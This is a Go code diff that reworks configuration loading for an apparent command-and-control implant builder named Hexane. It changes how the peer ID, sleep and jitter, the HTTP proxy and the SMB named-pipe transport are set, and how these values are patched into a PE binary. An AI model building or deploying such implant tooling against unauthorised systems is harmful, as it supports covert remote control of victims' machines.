@@ -108,10 +108,10 @@ func (h *HexaneConfig) CreateConfig(jsn JsonConfig) error {
 
 func ReadConfig(file string) error {
 	var (
-		h, peer *HexaneConfig
-		jsn     JsonConfig
-		buf     []byte
-		err     error
+		h   *HexaneConfig
+		jsn JsonConfig
+		buf []byte
+		err error
 	)
 
 	WrapMessage("INF", fmt.Sprintf("loading %s.json", file))
@@ -135,10 +135,7 @@ func ReadConfig(file string) error {
 		h.GroupId = Payloads.Group
 	}
 
-	h.Implant.IngressPipe = GenerateUuid(24)
-	if h.Implant.PeerId = GeneratePeerId(); h.Implant.PeerId == 0 {
-		return err
-	}
+	h.Implant.PeerId = GeneratePeerId()
 
 	h.Implant.Sleeptime = uint32(jsn.Config.Sleeptime)
 	h.Implant.Jitter = uint32(jsn.Config.Jitter)
@@ -184,15 +181,12 @@ func ReadConfig(file string) error {
 			h.Implant.bProxy = true
 			h.Proxy.Proto = "http://"
 			h.Proxy.Address = jsn.Network.Proxy.Address
-			h.Proxy.Port = strconv.Itoa(int(jsn.Network.Proxy.Port))
+			h.Proxy.Port = strconv.Itoa(jsn.Network.Proxy.Port)
 		}
 	} else if jsn.Network.ProfileType == "smb" {
 
 		h.Implant.ProfileTypeId = TRANSPORT_PIPE
-
-		if peer = GetPeerNameByGID(h.GroupId); peer != nil {
-			h.Implant.EgressPipe = peer.Implant.IngressPipe
-		}
+		h.Implant.EgressPipe = GenerateUuid(24)
 	}
 
 	h.UserSession = s
@@ -212,7 +206,6 @@ func (h *HexaneConfig) PePatchConfig() ([]byte, error) {
 
 	hStream.AddString(h.Implant.Hostname)
 	hStream.AddString(h.Implant.Domain)
-	hStream.AddWString(h.Implant.IngressPipe)
 	hStream.AddDword(h.Implant.PeerId)
 	hStream.AddDword(h.Implant.Sleeptime)
 	hStream.AddDword(h.Implant.Jitter)
